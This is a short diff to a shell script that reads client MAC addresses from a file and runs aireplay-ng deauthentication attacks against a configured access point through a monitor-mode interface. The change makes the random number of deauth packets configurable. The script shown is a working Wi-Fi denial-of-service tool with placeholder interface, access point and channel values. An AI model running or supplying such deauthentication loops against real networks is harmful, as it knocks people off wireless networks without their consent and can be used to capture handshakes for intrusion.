@@ -16,6 +16,7 @@
 IFC="wlanX"
 AP="00:00:00:00:00:00"
 CHANNEL="X"
+DEAUTH=5
 
 MON=`cat /sys/class/net/$IFC"mon"/operstate`
 if [ "$MON" != "unknown" ] ; then
@@ -24,5 +25,5 @@ if [ "$MON" != "unknown" ] ; then
 fi
 
 while IFS='' read -r line || [[ -n "$line" ]]; do
-        aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a $AP -c $line $IFC"mon"
+        aireplay-ng --deauth $(( $RANDOM % $DEAUTH + 1)) -a $AP -c $line $IFC"mon"
 done < "$1"
